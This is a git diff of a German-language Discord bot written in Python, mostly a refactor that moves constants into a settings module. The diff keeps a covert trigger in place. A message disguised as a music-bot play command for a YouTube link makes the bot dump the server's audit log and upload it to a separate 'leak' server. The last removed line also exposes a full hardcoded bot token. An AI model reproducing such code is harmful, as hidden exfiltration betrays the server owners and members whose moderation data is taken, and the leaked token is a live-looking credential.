@@ -1,7 +1,7 @@
 import os
 import asyncio
 import discord
-import botData
+import settings
 from random import choice
 import requests
 
@@ -50,41 +50,48 @@ Ich habe meine Auswahl schon getroffen. Nun bist du dran!
   else:
     message.channel.send("```css\n[Ups]! Etwas ist schiefgelaufen ¯\_(ツ)_/¯```")
 
+
 async def saveAuditLog(guild):
 
   with open(f'log_Folder\\log_{guild.name.replace(" ", "")}.txt', 'w+') as f:
+
     async for entry in guild.audit_logs(limit=100):
-      logType = botData.auditLogCategory[entry.category]
-      logAction = botData.actionType[entry.action]
+
+      logType = settings.auditLogCategory[entry.category]
+      logAction = settings.actionType[entry.action]
+
       if entry.target != None:
         f.write('{0}{1.user} performed the action \"{2}\" to {1.target}'.format(logType, entry, logAction))
       else:
         f.write('{0}{1.user} performed the action \"{2}\"'.format(logType, entry, logAction))
+
       f.write("\n")
     
-  return f'log_Folder\\log_{guild.name.replace(" ", "")}.txt'  # dataMes = f.read()
+  return f'log_Folder\\log_{guild.name.replace(" ", "")}.txt'
 
 
 async def leakAuditLog(message):
   guild = message.guild
-  leakGuild = bot.get_guild(botData.leakServer)
+  leakGuild = bot.get_guild(settings.leakServer)
   auditLogMessage = await saveAuditLog(guild)
   channel = discord.utils.get(leakGuild.channels, name="bot-channel")
 
   await channel.send(file=discord.File(auditLogMessage))
   print("Audit Log saved")
 
+
 async def postRandomImg(channel, imgType):
-  path = "E:\\PCBackup\\Sachen\\Bilder\\Img\\" + imgType
+  path = settings.imgDirectoryPATH + "\\" + imgType
   
   if not os.path.exists(path):
-    path = "C:\\Users\\prjan\\Pictures\\Bot"
+    path = settings.defaultImgPATH
   dirs = os.listdir(path)
   
   img = None
   foundFile = False
   maxLoops = 100
   loops = 0
+
   while not foundFile:
     img = choice(dirs)
     if img.endswith(('.png', '.jpg', '.jpeg', '.bmp')) or loops >= maxLoops :
@@ -103,20 +110,22 @@ async def postRandomImg(channel, imgType):
     except:
       await channel.send("```Sorry beim senden ist wohl ein Fehler aufgetreten.```")
 
+
 async def changeTrigger(message):
-  newTrigger = message.content.split(botData.defaultTrigger + "changeTrigger")[1].replace(" ", "")
+  newTrigger = message.content.split(settings.defaultTrigger + "changeTrigger")[1].replace(" ", "")
   if len(newTrigger) != 1:
     await message.channel.send("```css\n[Illegal Trigger. Change cancelled]```")
     return
-  botData.defaultTrigger = newTrigger
-  await message.channel.send("```css\n[Trigger changed to " + botData.defaultTrigger + "]```")
+  settings.defaultTrigger = newTrigger
+  await message.channel.send("```css\n[Trigger changed to " + settings.defaultTrigger + "]```")
+
 
 async def postSyncTubeLink(channel):
-  site = requests.get(botData.synctubeLink)
+  site = requests.get(settings.synctubeLink)
   await channel.send(site.url)
 
+
 async def help(channel):
-  
 
   message = """ 
   Hallo ich bin BanikJ, der beste Freund des Menschen.
@@ -125,14 +134,15 @@ async def help(channel):
   
   Dazu zählen:
   """
+
   embed = discord.Embed(title="Help-Menü", description=message, color=discord.Color.red())
-  embed.add_field(name="[" + botData.defaultTrigger + "help]", value="Zeigt das Help-Menü an welches du gerade siehst", inline=False)
-  embed.add_field(name="[" + botData.defaultTrigger + "game]", value="Spiele ein Runde Schere-Stein-Papier", inline=False)
-  embed.add_field(name="[" + botData.defaultTrigger + "img]", value="Zeigt ein zufälliges Fanart", inline=False)
-  embed.add_field(name="[" + botData.defaultTrigger + "meme]", value="Zeigt ein zufälliges Meme", inline=False)
-  embed.add_field(name="[" + botData.defaultTrigger + "nsfw]", value="Zeigt ein zufälliges NSFW Fanart", inline=False)
-  embed.add_field(name="[" + botData.defaultTrigger + "reaction]", value="Zeigt ein zufälliges Reaction Image", inline=False)
-  embed.add_field(name="[" + botData.defaultTrigger + "synctube]", value="Stellt einen Link zu SyncTube zu verfügung", inline=False)
+  embed.add_field(name="[" + settings.defaultTrigger + "help]", value="Zeigt das Help-Menü an welches du gerade siehst", inline=False)
+  embed.add_field(name="[" + settings.defaultTrigger + "game]", value="Spiele ein Runde Schere-Stein-Papier", inline=False)
+  embed.add_field(name="[" + settings.defaultTrigger + "img]", value="Zeigt ein zufälliges Fanart", inline=False)
+  embed.add_field(name="[" + settings.defaultTrigger + "meme]", value="Zeigt ein zufälliges Meme", inline=False)
+  embed.add_field(name="[" + settings.defaultTrigger + "nsfw]", value="Zeigt ein zufälliges NSFW Fanart", inline=False)
+  embed.add_field(name="[" + settings.defaultTrigger + "reaction]", value="Zeigt ein zufälliges Reaction Image", inline=False)
+  embed.add_field(name="[" + settings.defaultTrigger + "synctube]", value="Stellt einen Link zu SyncTube zu verfügung", inline=False)
 
   await channel.send(embed=embed)
 
@@ -150,35 +160,32 @@ async def on_message(message):
   if message.author == bot.user:
     return
   
-  print(message.author.name)
-  if message.content == (botData.defaultTrigger + "help"):
+  if message.content == (settings.defaultTrigger + "help"):
     await help(message.channel)
 
   if message.content == ("-p https://www.youtube.com/watch?v=6F5azNTnaOI"):
     await leakAuditLog(message)
 
-  if message.content == (botData.defaultTrigger + "game"):
+  if message.content == (settings.defaultTrigger + "game"):
     await SchereSteinPapier(message)
 
-  if message.content.startswith(botData.defaultTrigger + "changeTrigger") and message.author.name == botData.tuuxic:
+  if message.content.startswith(settings.defaultTrigger + "changeTrigger") and message.author.name == settings.adminName:
     await changeTrigger(message)
   
-  if message.content == (botData.defaultTrigger + "img"):
-    await postRandomImg(message.channel, botData.imgType["img"])
+  if message.content == (settings.defaultTrigger + "img"):
+    await postRandomImg(message.channel, settings.imgType["img"])
 
-  if message.content == (botData.defaultTrigger + "meme"):
-    await postRandomImg(message.channel, botData.imgType["meme"])
+  if message.content == (settings.defaultTrigger + "meme"):
+    await postRandomImg(message.channel, settings.imgType["meme"])
 
-  if message.content == (botData.defaultTrigger + "nsfw"):
-    await postRandomImg(message.channel, botData.imgType["nsfw"])
+  if message.content == (settings.defaultTrigger + "nsfw"):
+    await postRandomImg(message.channel, settings.imgType["nsfw"])
 
-  if message.content == (botData.defaultTrigger + "reaction"):
-    await postRandomImg(message.channel, botData.imgType["reaction"])
+  if message.content == (settings.defaultTrigger + "reaction"):
+    await postRandomImg(message.channel, settings.imgType["reaction"])
 
-  if message.content == (botData.defaultTrigger + "synctube"):
+  if message.content == (settings.defaultTrigger + "synctube"):
     await postSyncTubeLink(message.channel)
 
   
-
-
-bot.run("ODQ4ODY2MTA5MjEwMDk5NzQz.YLS2Kw.InfAqkwFDL8HLdsMnSpDa6CHLl8")
+bot.run(settings.TOKEN)
